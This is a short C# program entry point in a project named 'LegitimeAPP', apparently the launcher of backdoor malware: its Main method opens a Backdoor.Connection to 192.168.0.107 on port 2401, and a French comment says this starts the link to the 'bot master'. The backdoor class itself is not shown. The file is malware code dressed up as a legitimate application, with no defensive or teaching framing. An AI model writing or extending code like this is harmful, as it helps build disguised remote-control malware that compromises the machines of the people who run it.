
using System ;
using LegitimeAPP.Backdoor ; 




namespace LegitimeAPP
{
    internal class Program
    {

        static void Main(string[] args)
        {

            /* 
            lance la connexion avec le bot master
            */ 
            _ = new Backdoor.Connection("192.168.0.107", 2401); 
        }
    }
}
